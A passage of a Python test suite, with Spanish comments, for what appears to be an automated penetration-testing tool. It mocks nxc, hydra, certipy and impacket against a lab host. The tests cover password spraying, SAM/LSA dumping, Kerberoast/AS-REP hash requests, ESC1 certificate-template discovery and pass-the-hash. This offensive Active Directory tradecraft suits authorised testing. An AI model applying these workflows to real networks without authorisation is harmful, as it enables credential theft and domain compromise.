        if "smb" in cmd and "robin" in cmd:
            return 0, "SMB 10.0.0.1 445 H [+] robin:*** "
        return 1, "x [-] STATUS_LOGON_FAILURE"

    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_rz
    try:
        _rz_smb, _rz_ssh = _fp("reuse-smb", "x", [445]), _fp("reuse-ssh", "x", [22])
        _rz_tried = {("robin", "pw", False, "ssh")}   # robin ya se encontró por ssh; falta probar smb
        _rz_enriched = set()
        _reuse_chain("10.0.0.1", {"smb": [{"port": 445}], "ssh": [{"port": 22}]},
                     {"smb": (445, None), "ssh": (22, 22)}, {"smb": _rz_smb, "ssh": _rz_ssh},
                     [{"user": "robin", "secret": "pw", "is_hash": False}], _rz_tried, _rz_enriched,
                     "FAKE_NXC", False, False, None, set(), None)
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
    assert ("robin", "pw", False, "smb") in _rz_tried              # se probó por smb (no estaba en tried)
    assert any(s == "alta" and "reutilizada" in t.lower() for s, t in _rz_smb["findings"])
    assert "smb" in _rz_enriched                                  # y se enumeró smb con la credencial reutilizada
    assert any("--shares" in " ".join(c) for c in _rz_cmds)       # _creds_enum corrió de verdad

    # --local-auth en provided_creds_check: se añade en protocolos NTLM (smb, aquí) cuando
    # se pide, y se EXCLUYE a propósito en ssh (nxc no distingue dominio/local ahí — ver
    # _NXC_LOCAL_AUTH_PROTOS). Mock simple: ambos intentos fallan limpio, no hace falta
    # simular un Pwn3d! para esto, solo mirar qué argv construyó cada protocolo.
    _la_cmds = []

    def _fake_la_run_capture(cmd, timeout=None, quiet=False, **kw):
        _la_cmds.append(cmd)
        return 1, "SMB 10.0.0.1 445 DC01 [-] STATUS_LOGON_FAILURE"

    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_la_run_capture
    try:
        provided_creds_check("10.0.0.1",
                             [{"port": 445, "name": "microsoft-ds"}, {"port": 22, "name": "ssh"}],
                             [("eve", "Pass123")], local_auth=True)
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
    _la_smb = next(c for c in _la_cmds if "smb" in c)
    _la_ssh = next(c for c in _la_cmds if "ssh" in c)
    assert "--local-auth" in _la_smb
    assert "--local-auth" not in _la_ssh

    # provided_creds_check en modo bulk: nxc/run_capture mockeados (sin red) — comprueba
    # que escribe las DOS listas a fichero, pasa --continue-on-success (+--no-bruteforce
    # si se pide), pide quiet=True (no inunda la terminal), enmascara la contraseña en el
    # output guardado, y que los hallazgos (incluido Pwn3d!) salen con la severidad
    # correcta — sin esto no hay forma de probar la rama bulk sin un nxc/objetivo real.
    # El propio Pwn3d! de "alice" encadena un volcado SAM/LSA automático (2 pasos más) Y la
    # nueva enumeración CON la credencial (_creds_enum: --shares/--users/--pass-pol/--rid-brute,
    # 4 pasos — ya NO se capan con is_dc: SAMR/LSA enumeran también cuentas LOCALES en un SMB
    # suelto, ver _creds_enum): el mock los responde vacíos/fallidos para no acoplar este test
    # al de _dump_sam_lsa/_creds_enum de arriba, que ya los cubren a fondo con datos reales.
    _real_nxc_bin2, _real_run_capture = nxc_bin, run_capture
    _real_hydra_bin_b = hydra_bin
    globals()["hydra_bin"] = lambda: None   # esta tanda cubre el camino nxc (fallback): hydra "ausente"

    def _fake_nxc_bin():
        return "FAKE_NXC"

    def _make_fake_run_capture(seen):
        def _fake_run_capture(cmd, timeout=None, quiet=False, **kw):
            seen.append((cmd, timeout, quiet))
            if "--sam" in cmd or "--lsa" in cmd:
                return 1, "SMB 10.0.0.1 445 DC01 [-] STATUS_LOGON_FAILURE"
            # -u apunta a un fichero de verdad SOLO en la llamada bulk (userfile); en la
            # explícita (--creds-file, más abajo) o en _creds_enum, -u es el usuario literal
            # ("dave"/"alice") — así el mismo mock sirve para las tres sin asserts cruzados.
            uf_path = cmd[cmd.index("-u") + 1]
            if Path(uf_path).is_file():
                pf_path = cmd[cmd.index("-p") + 1]
                assert Path(uf_path).read_text().splitlines() == ["alice", "bob"]
                assert Path(pf_path).read_text().splitlines() == ["Summer2024", "Winter2024"]
                return 0, ("SMB 10.0.0.1 445 DC01 [+] CORP\\alice:Summer2024 (Pwn3d!)\n"
                           "SMB 10.0.0.1 445 DC01 [-] bob:Winter2024 STATUS_LOGON_FAILURE\n")
            return 1, "SMB 10.0.0.1 445 DC01 [-] STATUS_LOGON_FAILURE"
        return _fake_run_capture

    _seen_cmds = []
    globals()["nxc_bin"], globals()["run_capture"] = _fake_nxc_bin, _make_fake_run_capture(_seen_cmds)
    try:
        _bres = provided_creds_check("10.0.0.1", [{"port": 445, "name": "microsoft-ds"}], [],
                                     bulk=(["alice", "bob"], ["Summer2024", "Winter2024"], False))
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin2, _real_run_capture
    assert len(_seen_cmds) == 8   # 1 spray + 2 del volcado SAM/LSA + 5 de _creds_enum (--shares/--users/--pass-pol/--rid-brute/--loggedon-users, ya sin gate is_dc) — todo por el Pwn3d! de alice
    _cmd, _timeout, _quiet = _seen_cmds[0]
    assert _quiet is True and "--continue-on-success" in _cmd and "--no-bruteforce" not in _cmd
    assert _timeout and _timeout > 0
    _bstep = _bres[0]["steps"][0]
    assert "Summer2024" not in _bstep["output"] and "***" in _bstep["output"]   # contraseña enmascarada
    _bfindings = {(s, t) for s, t in _bres[0]["findings"]}
    assert any(s == "critica" and "alice:Summer2024" in t and "Pwn3d!" in t for s, t in _bfindings)   # ganadora en CLARO (botín)
    # el gap que motivó el fix: el spray (-U/-P) también dispara _creds_enum para la credencial
    # ganadora, no solo el bucle 1-a-1 — el fichero de contraseña de la llamada --shares es el
    # de ESA credencial (alice/Summer2024), no un -p vacío, y el secreto no va nunca en el argv
    _shares_cmd = next(c for c, _, _ in _seen_cmds if "--shares" in c)
    assert "alice" in _shares_cmd and "Summer2024" not in " ".join(_shares_cmd)
    assert _shares_cmd[_shares_cmd.index("-p") + 1].endswith(".pw")
    # con --no-bruteforce (palantir) debe pasarse --no-bruteforce a nxc también
    _seen_cmds2 = []
    globals()["nxc_bin"], globals()["run_capture"] = _fake_nxc_bin, _make_fake_run_capture(_seen_cmds2)
    try:
        provided_creds_check("10.0.0.1", [{"port": 445, "name": "microsoft-ds"}], [],
                             bulk=(["alice", "bob"], ["Summer2024", "Winter2024"], True))
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin2, _real_run_capture
    assert "--no-bruteforce" in _seen_cmds2[0][0]
    # creds explícitas (--creds-file) conviven con bulk SIN cruzarse: cada una es su propio
    # par; aquí basta con que no reviente y devuelva algo coherente (la cobertura del
    # bucle 1-a-1 ya existe más abajo con el footprint "reuse" de siempre).
    _seen_cmds3 = []
    globals()["nxc_bin"], globals()["run_capture"] = _fake_nxc_bin, _make_fake_run_capture(_seen_cmds3)
    try:
        _mix = provided_creds_check("10.0.0.1", [{"port": 445, "name": "microsoft-ds"}], [("dave", "ExplicitPass")],
                                    bulk=(["alice", "bob"], ["Summer2024", "Winter2024"], False))
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin2, _real_run_capture
    # 1 bulk + 2 del volcado encadenado (alice) + 5 de _creds_enum (alice: --shares/--users/
    # --pass-pol/--rid-brute/--loggedon-users, ya sin gate is_dc) + 1 explícito de "dave" ("dave"
    # no vuelve a disparar _creds_enum: "smb" ya está en 'enriched')
    assert len(_mix[0]["steps"]) == 9

    # Orden de protocolos (_CREDS_PROTO_PRIORITY): SMB antes que WMI (más lento y con un bug
    # confirmado de nxc contra listas de usuarios) y que LDAP/WinRM/RDP/MSSQL, sea el orden de
    # puertos que sea (aquí WMI/135 va ANTES que SMB/445 en 'services' — justo el caso real que
    # lo destapó: un DC con 135 abierto antes de 139/445 probaba 56 usuarios por WMI primero).
    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), (
        lambda cmd, timeout=None, quiet=False, **kw: (1, "[-] STATUS_LOGON_FAILURE"))
    try:
        _ord_res = provided_creds_check("10.0.0.1",
            [{"port": 135, "name": "msrpc"}, {"port": 445, "name": "microsoft-ds"}, {"port": 389, "name": "ldap"}],
            [("eve", "Pass123")])
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin2, _real_run_capture
    _ord = [r["proto"] for r in _ord_res]
    assert _ord.index("reuse-smb") < _ord.index("reuse-wmi")
    assert _ord.index("reuse-ldap") < _ord.index("reuse-wmi")
    globals()["hydra_bin"] = _real_hydra_bin_b   # fin de la tanda que forzaba el fallback a nxc

    # ── Fase 5d con HYDRA (nuevo): brute de listas ssh/ftp/smb por hydra ──
    # _parse_hydra_hits: formato real de hydra ('[PORT][service] host: IP login: U password: P')
    assert _parse_hydra_hits(
        "[DATA] attacking ftp://10.0.0.1:2121/\n"
        "[2121][ftp] host: 10.0.0.1   login: robin   password: s3cr3t\n"
        "1 of 1 target successfully completed, 1 valid password found\n"
    ) == [{"user": "robin", "password": "s3cr3t", "pwn3d": False}]
    # ssh/smb meten 'misc: (null)' entre host y login — el regex debe saltarlo (si no, 0 hits: el bug real)
    assert _parse_hydra_hits(
        "[22][ssh] host: 10.0.0.1   misc: (null)   login: robin   password: 7iz4rnckjsduza7\n"
    ) == [{"user": "robin", "password": "7iz4rnckjsduza7", "pwn3d": False}]
    # _hydra_bulk: FTP ok / SSH publickey sin hits / SSH hit pese a errores / SMB guest-map→omite / SMB normal→confirma.
    # nxc/hydra/run_capture mockeados (sin red); cmd[0] distingue hydra ("hydra") de nxc ("FAKE_NXC").
    _rhb, _rrc_h, _rnb_h = hydra_bin, run_capture, nxc_bin
    globals()["hydra_bin"] = lambda: "hydra"
    globals()["nxc_bin"] = lambda: "FAKE_NXC"
    try:
        # (a) FTP: hydra encuentra robin → hit directo, paso con la contraseña enmascarada
        globals()["run_capture"] = lambda cmd, timeout=None, quiet=False, **kw: (
            0, "[2121][ftp] host: 10.0.0.1   login: robin   password: s3cr3t\n")
        _rf = _fp("reuse-ftp", "x", [2121])
        assert _hydra_bulk(_rf, "ftp", "10.0.0.1", 2121, 21, ["robin"], ["s3cr3t"], False, "FAKE_NXC", False) == \
            [{"user": "robin", "password": "s3cr3t", "pwn3d": False}]
        assert _rf["steps"][0]["cmd"].startswith("hydra ")
        assert "s3cr3t" not in _rf["steps"][0]["output"] and "***" in _rf["steps"][0]["output"]
        # (b) SSH solo-publickey y SIN hits: hydra 'method reply' → sin hits, hallazgo info
        globals()["run_capture"] = lambda cmd, timeout=None, quiet=False, **kw: (
            1, "[ERROR] target ssh://10.0.0.1:22/ does not support password authentication (method reply 4).\n")
        _rs = _fp("reuse-ssh", "x", [22])
        assert _hydra_bulk(_rs, "ssh", "10.0.0.1", 22, 22, ["jason"], ["aa", "bb"], False, "FAKE_NXC", False) == []
        assert any(s == "info" and "publickey" in t for s, t in _rs["findings"])
        # (b2) SSH con un hit PESE a errores 'does not support password auth' de cuentas publickey
        # mezcladas (el caso real: robin entra, jason es publickey) → el hit NO se descarta
        globals()["run_capture"] = lambda cmd, timeout=None, quiet=False, **kw: (
            0, "[22][ssh] host: 10.0.0.1   misc: (null)   login: robin   password: s3cr3t\n"
               "[ERROR] ssh target does not support password auth\n"
               "[ERROR] all children were disabled due too many connection errors\n")
        _rs2 = _fp("reuse-ssh", "x", [22])
        assert _hydra_bulk(_rs2, "ssh", "10.0.0.1", 22, 22, ["robin", "jason"], ["s3cr3t"], False, "FAKE_NXC", False) == \
            [{"user": "robin", "password": "s3cr3t", "pwn3d": False}]
        # (c) SMB guest-mapping: hydra avisa 'might accept any credential' → NO se omite; reintenta con
        # nxc --local-auth (auth local real, ignora el guest-trap) y saca el login verdadero (jason).
        _gm_cmds = []

        def _smb_gm(cmd, timeout=None, quiet=False, **kw):
            _gm_cmds.append(cmd)
            if cmd[0] == "hydra":
                return 0, ("[WARNING] 10.0.0.1 might accept any credential\n"
                           "[445][smb2] host: 10.0.0.1   misc: (null)   login: jason   password: Winter2024\n")
            return 0, "SMB 10.0.0.1 445 H [+] jason:Winter2024\n"   # nxc --local-auth = ground truth
        globals()["run_capture"] = _smb_gm
        _rsm = _fp("reuse-smb", "x", [445])
        _hgm = _hydra_bulk(_rsm, "smb", "10.0.0.1", 445, None, ["jason"], ["Winter2024"], False, "FAKE_NXC", False)
        assert any(h["user"] == "jason" for h in _hgm)                                # nxc --local-auth SÍ lo saca
        assert any("--local-auth" in c for c in _gm_cmds if c and c[0] != "hydra")    # y usó --local-auth (ignora guest-trap)
        assert any("might accept any credential" in st["note"] for st in _rsm["steps"])
        # (d) SMB normal (formato real con 'misc: (null)'): hydra encuentra alice → nxc la confirma admin (Pwn3d!)
        def _smb_ok(cmd, timeout=None, quiet=False, **kw):
            if cmd[0] == "hydra":
                return 0, "[445][smb2] host: 10.0.0.1   misc: (null)   login: alice   password: Pass123\n"
            return 0, "SMB 10.0.0.1 445 H [+] CORP\\alice:Pass123 (Pwn3d!)\n"
        globals()["run_capture"] = _smb_ok
        _rsm2 = _fp("reuse-smb", "x", [445])
        assert _hydra_bulk(_rsm2, "smb", "10.0.0.1", 445, None, ["alice"], ["Pass123"], False, "FAKE_NXC", False) == \
            [{"user": "alice", "password": "Pass123", "pwn3d": True}]
        # (e) hydra no pudo conectar y SIN hits → hallazgo 'media' (no un falso «sin credenciales»)
        globals()["run_capture"] = lambda cmd, timeout=None, quiet=False, **kw: (
            1, "[DATA] attacking ftp://10.0.0.1:2121/\n[ERROR] could not connect to ftp://10.0.0.1:2121 - No route to host\n")
        _rfe = _fp("reuse-ftp", "x", [2121])
        assert _hydra_bulk(_rfe, "ftp", "10.0.0.1", 2121, 21, ["robin"], ["x"], False, "FAKE_NXC", False) == []
        assert any(s == "media" and "NO significa" in t for s, t in _rfe["findings"])
        # (f) Regresión: SMB en puerto NO estándar (1445) debe llevar el puerto en el target de
        # hydra ("smb2://ip:1445") — antes SMB era el único protocolo que lo omitía SIEMPRE
        # (a diferencia de ssh/ftp), así que hydra atacaba el 445 por defecto en vez del real.
        _smb_port_cmds = []

        def _smb_port(cmd, timeout=None, quiet=False, **kw):
            _smb_port_cmds.append(cmd)
            return (0, "") if cmd[0] == "hydra" else (0, "")
        globals()["run_capture"] = _smb_port
        _hydra_bulk(_fp("reuse-smb", "x", [1445]), "smb", "10.0.0.1", 1445, None, ["jason"], ["Winter2024"], False, "FAKE_NXC", False)
        _hcmd = next(c for c in _smb_port_cmds if c[0] == "hydra")
        assert "smb2://10.0.0.1:1445" in _hcmd, _hcmd
    finally:
        globals()["hydra_bin"], globals()["run_capture"], globals()["nxc_bin"] = _rhb, _rrc_h, _rnb_h

    # _creds_enum: una credencial aportada VÁLIDA enumera el dominio CON ella (shares/usuarios/
    # grupos/roasting), NO como null/guest — el fallo que motivó este cambio (antes -u/-p solo
    # se probaba como login). Fake de nxc (sin red): login válido SIN Pwn3d + salidas de enum;
    # comprueba que la enum usa la credencial (su -p apunta al fichero temporal, no a ''), que
    # el secreto NUNCA va en el argv, y que el roasting/los shares salen como hallazgo.
    _enr_cmds = []
    _ENUM_MODS = ("--shares", "--users", "--groups", "--pass-pol", "--rid-brute", "--admin-count",
                  "--trusted-for-delegation", "--password-not-required", "--spider")

    def _fake_enrich_rc(cmd, timeout=None, quiet=False, **kw):
        _enr_cmds.append(cmd)
        if "--shares" in cmd:
            return 0, "SMB 10.0.0.1 445 DC01 [+] inlanefreight\\wwhite:\nSMB 10.0.0.1 445 DC01 IT          READ"
        if any(m in cmd for m in _ENUM_MODS):
            return 0, "SMB 10.0.0.1 445 DC01 [+] (enum ok)"
        return 0, "SMB 10.0.0.1 445 DC01 [+] inlanefreight\\wwhite:Secret123"   # login válido, sin Pwn3d

    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_enrich_rc
    try:
        _eres = provided_creds_check(
            "10.0.0.1",
            [{"port": 445, "name": "microsoft-ds"}, {"port": 389, "name": "ldap"},
             {"port": 88, "name": "kerberos-sec"}],
            [("wwhite", "Secret123")])
    finally:
        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin2, _real_run_capture
    assert any("smb" in c and "--users" in c for c in _enr_cmds)          # enum SMB CON la credencial
    assert all("Secret123" not in " ".join(c) for c in _enr_cmds)          # el secreto NUNCA va en el argv
    _usr = next(c for c in _enr_cmds if "smb" in c and "--users" in c)
    assert _usr[_usr.index("-p") + 1].endswith(".pw")                      # usó el fichero de la credencial, no -p ''
    # SMB y LDAP son protocolos distintos → _eres trae un footprint-dict POR CADA UNO (ver
    # docstring), no todo mezclado en un único índice [0] como antes del refactor. Sin dominio
    # conocido (domain=None) ni Kerberoast ni AS-REP corren (GetUserSPNs/GetNPUsers autenticados
    # necesitan 'domain/user:pass') — quedan como sugerencia manual, cubierto más abajo.
    assert len(_eres) == 2 and {r["proto"] for r in _eres} == {"reuse-smb", "reuse-ldap"}
    _ef = {(s, t) for r in _eres for s, t in r["findings"]}
    assert any("legible" in t and "IT" in t for s, t in _ef)

    # Certipy (AD CS): la rama LDAP de _creds_enum dispara 'certipy find -vulnerable' SOLO
    # si hay credencial válida + dominio YA resuelto (domain=…) + certipy instalado — sin
    # dominio se queda en sugerencia manual (placeholder "DOMINIO") y NUNCA se ejecuta a
    # ciegas; y si encuentra una plantilla vulnerable, 'certipy req' (escalada activa:
    # pide un certificado) solo se SUGIERE, nunca se encadena solo — igual que el resto
    # de pasos activos (NTDS dump, ver MEJORAS.md).
    _real_certipy_bin = globals()["certipy_bin"]
    _certipy_cmds = []

    def _fake_ldap_with_certipy(cmd, timeout=None, quiet=False, **kw):
        if cmd[0] == "FAKE_CERTIPY":
            _certipy_cmds.append(cmd)
            return 0, ("[*] Finding certificate templates\n"
                       "[!] Vulnerable Certificate Templates: ESC1\n"
                       "    Template Name                      : VulnTemplate\n"
                       "[*] Found 1 Certificate Authority(s)\n"
                       "Certificate Authorities\n    0\n      CA Name  : corp-DC01-CA\n")
        if any(m in cmd for m in _ENUM_MODS):
            return 0, "LDAP 10.0.0.1 389 DC01 [+] (enum ok)"
        return 0, "LDAP 10.0.0.1 389 DC01 [+] inlanefreight\\wwhite:Secret123"   # login válido, sin Pwn3d

    globals()["nxc_bin"], globals()["run_capture"], globals()["certipy_bin"] = (
        (lambda: "FAKE_NXC"), _fake_ldap_with_certipy, (lambda: "FAKE_CERTIPY"))
    try:
        _cres = provided_creds_check("10.0.0.1", [{"port": 389, "name": "ldap"}, {"port": 88, "name": "kerberos-sec"}],
                                     [("wwhite", "Secret123")], domain="inlanefreight.local")
    finally:
        globals()["nxc_bin"], globals()["run_capture"], globals()["certipy_bin"] = (
            _real_nxc_bin2, _real_run_capture, _real_certipy_bin)
    assert len(_certipy_cmds) == 1
    assert "wwhite@inlanefreight.local" in _certipy_cmds[0]
    assert "Secret123" in " ".join(_certipy_cmds[0])   # certipy no admite -p por fichero: va literal en el argv REAL…
    _cfind = next(r for r in _cres if r["proto"] == "reuse-ldap")
    _cstep = next(s for s in _cfind["steps"] if "certipy find" in s["cmd"])
    assert "Secret123" not in _cstep["cmd"] and "***" in _cstep["cmd"]   # …pero el comando GUARDADO/mostrado sí lo enmascara
    assert any(sev == "critica" and "ESC1" in t for sev, t in _cfind["findings"])
    assert any("certipy req" in n and "ESC1" in n for n in _cfind["next"])   # sugerencia MANUAL, nunca ejecutado

    # Sin dominio conocido todavía (domain=None, el caso normal: Fase 5d corre antes de
    # discover_domains()): certipy NO se ejecuta a ciegas con un dominio adivinado — se
    # deja como sugerencia con el placeholder "DOMINIO" (igual que GetNPUsers.py de Kerberos).
    _certipy_cmds2 = []

    def _fake_ldap_certipy_track(cmd, timeout=None, quiet=False, **kw):
        if cmd[0] == "FAKE_CERTIPY":
            _certipy_cmds2.append(cmd)
            return 0, ""
        if any(m in cmd for m in _ENUM_MODS):
            return 0, "LDAP 10.0.0.1 389 DC01 [+] (enum ok)"
        return 0, "LDAP 10.0.0.1 389 DC01 [+] inlanefreight\\wwhite:Secret123"

    globals()["nxc_bin"], globals()["run_capture"], globals()["certipy_bin"] = (
        (lambda: "FAKE_NXC"), _fake_ldap_certipy_track, (lambda: "FAKE_CERTIPY"))
    try:
        _cres2 = provided_creds_check("10.0.0.1", [{"port": 389, "name": "ldap"}, {"port": 88, "name": "kerberos-sec"}],
                                      [("wwhite", "Secret123")])   # domain=None
    finally:
        globals()["nxc_bin"], globals()["run_capture"], globals()["certipy_bin"] = (
            _real_nxc_bin2, _real_run_capture, _real_certipy_bin)
    assert _certipy_cmds2 == []   # sin dominio: ni se intenta ejecutar
    _cfind2 = next(r for r in _cres2 if r["proto"] == "reuse-ldap")
    assert any("certipy find" in n and "@DOMINIO" in n for n in _cfind2["next"])

    # AS-REP roast / Kerberoast: con dominio conocido, _creds_enum usa impacket-GetNPUsers y
    # impacket-GetUserSPNs (-request, sin wordlist) en vez de nxc --asreproast/--kerberoasting
    # (pedido explícito del operador, 09-nov: primero AS-REP, luego "kerberoasting que sea con
    # impacket-getuserspn") — mismo patrón que certipy: identidad+contraseña van LITERALES en
    # el argv real (impacket no admite -p por fichero), pero el comando GUARDADO/mostrado
    # enmascara la contraseña; sin dominio se deja como sugerencia manual con el placeholder
    # "DOMINIO", nunca se ejecuta.
    _real_impacket_suggest = globals()["_impacket_suggest_bin"]
    _getnp_cmds, _getspn_cmds = [], []

    def _fake_getnp_suggest(script):
        if script == "GetNPUsers":
            return "FAKE_GETNPUSERS"
        if script == "GetUserSPNs":
            return "FAKE_GETUSERSPNS"
        return _real_impacket_suggest(script)

    def _fake_ldap_with_getnp(cmd, timeout=None, quiet=False, **kw):
        if cmd[0] == "FAKE_GETNPUSERS":
            _getnp_cmds.append(cmd)
            return 0, ("$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:hash\n"
                       "$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:hash")
        if cmd[0] == "FAKE_GETUSERSPNS":
            _getspn_cmds.append(cmd)
            return 0, "$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$cifs~hash"
        if any(m in cmd for m in _ENUM_MODS):
            return 0, "LDAP 10.0.0.1 389 DC01 [+] (enum ok)"
        return 0, "LDAP 10.0.0.1 389 DC01 [+] inlanefreight\\wwhite:Secret123"

    globals()["nxc_bin"], globals()["run_capture"], globals()["_impacket_suggest_bin"] = (
        (lambda: "FAKE_NXC"), _fake_ldap_with_getnp, _fake_getnp_suggest)
    try:
        _gres = provided_creds_check("10.0.0.1", [{"port": 389, "name": "ldap"}, {"port": 88, "name": "kerberos-sec"}],
                                     [("wwhite", "Secret123")], domain="inlanefreight.local")
    finally:
        globals()["nxc_bin"], globals()["run_capture"], globals()["_impacket_suggest_bin"] = (
            _real_nxc_bin2, _real_run_capture, _real_impacket_suggest)
    assert len(_getnp_cmds) == 1
    assert "inlanefreight.local/wwhite:Secret123" in _getnp_cmds[0]   # identidad real (impacket: sin -p por fichero)
    assert "-request" in _getnp_cmds[0] and "-dc-ip" in _getnp_cmds[0]
    assert any(a.endswith("asrep.txt") for a in _getnp_cmds[0])        # ya no 'asrep_nxc.txt' (no lo escribe nxc)
    assert len(_getspn_cmds) == 1
    assert "inlanefreight.local/wwhite:Secret123" in _getspn_cmds[0]
    assert "-request" in _getspn_cmds[0] and "-dc-ip" in _getspn_cmds[0]
    assert any(a.endswith("kerb.txt") for a in _getspn_cmds[0])        # ya no 'kerb_nxc.txt' (no lo escribe nxc)
    _gfind = next(r for r in _gres if r["proto"] == "reuse-ldap")
    _gstep = next(s for s in _gfind["steps"] if "FAKE_GETNPUSERS" in s["cmd"])
    assert "Secret123" not in _gstep["cmd"] and "***" in _gstep["cmd"]  # comando GUARDADO/mostrado enmascara la contraseña
    _kstep = next(s for s in _gfind["steps"] if "FAKE_GETUSERSPNS" in s["cmd"])
    assert "Secret123" not in _kstep["cmd"] and "***" in _kstep["cmd"]
    assert any(sev == "alta" and "2 hash(es) de AS-REP" in t for sev, t in _gfind["findings"])
    assert any(sev == "alta" and "1 hash(es) de Kerberoast" in t for sev, t in _gfind["findings"])

    _getnp_cmds2, _getspn_cmds2 = [], []

    def _fake_ldap_getnp_track(cmd, timeout=None, quiet=False, **kw):
        if cmd[0] == "FAKE_GETNPUSERS":
            _getnp_cmds2.append(cmd)
            return 0, ""
        if cmd[0] == "FAKE_GETUSERSPNS":
            _getspn_cmds2.append(cmd)
            return 0, ""
        if any(m in cmd for m in _ENUM_MODS):
            return 0, "LDAP 10.0.0.1 389 DC01 [+] (enum ok)"
        return 0, "LDAP 10.0.0.1 389 DC01 [+] inlanefreight\\wwhite:Secret123"

    globals()["nxc_bin"], globals()["run_capture"], globals()["_impacket_suggest_bin"] = (
        (lambda: "FAKE_NXC"), _fake_ldap_getnp_track, _fake_getnp_suggest)
    try:
        _gres2 = provided_creds_check("10.0.0.1", [{"port": 389, "name": "ldap"}, {"port": 88, "name": "kerberos-sec"}],
                                      [("wwhite", "Secret123")])   # domain=None
    finally:
        globals()["nxc_bin"], globals()["run_capture"], globals()["_impacket_suggest_bin"] = (
            _real_nxc_bin2, _real_run_capture, _real_impacket_suggest)
    assert _getnp_cmds2 == [] and _getspn_cmds2 == []   # sin dominio: ni se intenta ejecutar
    _gfind2 = next(r for r in _gres2 if r["proto"] == "reuse-ldap")
    assert any("FAKE_GETNPUSERS" in n and "DOMINIO" in n and "-request" in n for n in _gfind2["next"])
    assert any("FAKE_GETUSERSPNS" in n and "DOMINIO" in n and "-request" in n for n in _gfind2["next"])

    # Regresión: MySQL/PostgreSQL en provided_creds_check() (Fase 5d) — antes esos dos protocolos
    # nunca entraban en `buckets` (_NXC_PROTO_OF no los tiene: no son protocolos de nxc), así que
    # las ramas que llamaban a _db_enum para ellos eran código muerto, inalcanzable de verdad.
    # Ahora pasan por _db_cred_test (cliente CLI real, mysql/psql) en vez de por nxc.
    _real_have_db = globals()["have"]
    globals()["have"] = lambda name: name in ("mysql", "psql")

    def _fake_db_rc(cmd, timeout=None, quiet=False, **kw):
        if cmd[0] == "mysql":
            return (0, "1") if kw.get("env", {}).get("MYSQL_PWD") == "goodpw" else (1, "ERROR 1045: Access denied")
        if cmd[0] == "psql":
            return (0, "1") if kw.get("env", {}).get("PGPASSWORD") == "goodpw" else (1, "FATAL: password authentication failed")
        return 0, ""
    globals()["run_capture"] = _fake_db_rc
    try:
        _dbres = provided_creds_check("10.0.0.1",
            [{"port": 3306, "name": "mysql"}, {"port": 5432, "name": "postgresql"}],
            [("root", "goodpw")])
    finally:
        globals()["have"], globals()["run_capture"] = _real_have_db, _real_run_capture
    assert {r["proto"] for r in _dbres} == {"reuse-mysql", "reuse-postgres"}   # antes ni se intentaba
    _dbfindings = {(s, t) for r in _dbres for s, t in r["findings"]}
    assert any(s == "alta" and "MYSQL" in t and "válida" in t for s, t in _dbfindings)
    assert any(s == "alta" and "POSTGRES" in t and "válida" in t for s, t in _dbfindings)
    # la contraseña NUNCA en el argv (va por variable de entorno MYSQL_PWD/PGPASSWORD) ni en el
    # comando guardado (se enmascara igual que el resto de la Fase 5d)
    for _r in _dbres:
        for _st in _r["steps"]:
            assert "goodpw" not in _st["cmd"]
    # pass-the-hash (-H) no aplica a auth de BD: ni lo intenta, deja dicho por qué
    globals()["have"] = lambda name: name in ("mysql", "psql")
    globals()["run_capture"] = _fake_db_rc
    try:
        _dbres_h = provided_creds_check("10.0.0.1", [{"port": 3306, "name": "mysql"}],
                                        [("root", "AAAA")], is_hash=True)
    finally:
        globals()["have"], globals()["run_capture"] = _real_have_db, _real_run_capture
    assert any("pass-the-hash" in t for s, t in _dbres_h[0]["findings"])
    assert not _dbres_h[0]["steps"]   # no se ejecutó ningún intento real

    # Regresión: SIN nxc instalado pero con SMB *y* MySQL detectados — antes la función entera
    # abortaba en la primera línea con "nxc no está instalado" (ni probaba mysql, que no lo
    # necesita). Ahora SMB se salta avisando y mysql se prueba igual.
    globals()["nxc_bin"] = lambda: None
    globals()["have"] = lambda name: name == "mysql"
    globals()["run_capture"] = _fake_db_rc
    try:
        _dbmix = provided_creds_check("10.0.0.1",
            [{"port": 445, "name": "microsoft-ds"}, {"port": 3306, "name": "mysql"}],
            [("root", "goodpw")])
    finally:
        globals()["nxc_bin"], globals()["have"], globals()["run_capture"] = _real_nxc_bin2, _real_have_db, _real_run_capture
    assert {r["proto"] for r in _dbmix} == {"reuse-mysql"}   # smb se saltó (sin nxc), mysql no lo necesitaba
    assert any(s == "alta" and "MYSQL" in t for r in _dbmix for s, t in r["findings"])

    # _creds_enum en pass-the-hash (-H): la enum usa -H <hash> (no -p). En el ARGV (mientras
    # nxc corre de verdad) el hash va literal — nxc no admite ahí el truco de fichero que SÍ
    # tiene -p, así que es inevitable, igual que si lo escribieras tú a mano. Pero en lo que
    # queda GUARDADO (el comando MOSTRADO en steps/informe) se enmascara igual que una
    # contraseña: un hash NTLM es tan reutilizable como la contraseña en claro.
    _enr_cmds2 = []

    def _fake_enrich_rc2(cmd, timeout=None, quiet=False, **kw):
        _enr_cmds2.append(cmd)
        if "--shares" in cmd:
            return 0, "SMB 10.0.0.1 445 DC01 [+] x\\admin:\nSMB 10.0.0.1 445 DC01 C$          READ,WRITE"
        if any(m in cmd for m in _ENUM_MODS):
            return 0, "ok"
        return 0, "SMB 10.0.0.1 445 DC01 [+] x\\admin: (Pwn3d!)"   # login PtH con Pwn3d

    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_enrich_rc2
    try:
        _hres = provided_creds_check("10.0.0.1", [{"port": 445, "name": "microsoft-ds"}],
                             [("admin", "31d6cfe0d16ae931b73c59d7e0c089c0")], is_hash=True)
    finally:
